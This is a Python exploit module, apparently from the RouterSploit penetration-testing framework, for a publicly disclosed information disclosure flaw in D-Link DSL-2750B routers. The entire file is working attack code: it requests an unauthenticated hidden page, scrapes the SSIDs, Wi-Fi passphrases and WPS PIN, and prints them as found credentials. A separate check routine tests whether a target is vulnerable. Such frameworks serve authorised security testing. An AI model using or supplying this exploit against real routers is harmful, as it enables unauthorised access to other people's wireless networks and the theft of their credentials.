import re

from routersploit import (
    exploits,
    print_success,
    print_error,
    print_table,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for DSL-2750B Information Disclosure vulnerability.
    If the target is vulnerable it allows to read SSID, Wi-Fi password and PIN code."
    """
    __info__ = {
        'name': 'D-Link DSL-2750B Info Disclosure',
        'description': 'Module explois information disclosure vulnerability in D-Link DSL-2750B devices. It is possible to retrieve sensitive information such as SSID, Wi-Fi password, PIN code.',
        'authors': [
            'Alvaro Folgado # vulnerability discovery',
            'Jose Rodriguez # vulnerability discovery',
            'Ivan Sanz # vulnerability discovery',
            'Marcin Bury <marcin.bury[at]reverse-shell.com> # routersploit module',
        ],
        'references': [
            'http://seclists.org/fulldisclosure/2015/May/129'
        ],
        'devices': [
            'D-Link DSL-2750B EU_1.01',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port')  # default port

    def run(self):
        url = "{}:{}/hidden_info.html".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return

        creds = []
        data = ['2.4G SSID', '2.4G PassPhrase', '5G SSID', '5G PassPhrase', 'PIN Code']

        for d in data:
            regexp = "<td nowrap><B>{}:</B></td>\r\n\t\t\t<td>(.+?)</td>".format(d)
            val = re.findall(regexp, response.text)

            if len(val):
                creds.append((d, val[0]))

        if len(creds):
            print_success("Credentials found!")
            headers = ("Option", "Value")
            print_table(headers, *creds)
        else:
            print_error("Exploit failed - credentials could not be found")

    @mute
    def check(self):
        url = "{}:{}/hidden_info.html".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return False  # target is not vulnerable

        if all(map(lambda x: x in response.text, ["SSID", "PassPhrase"])):
            return True  # target is vulnerable

        return False  # target is not vulnerable
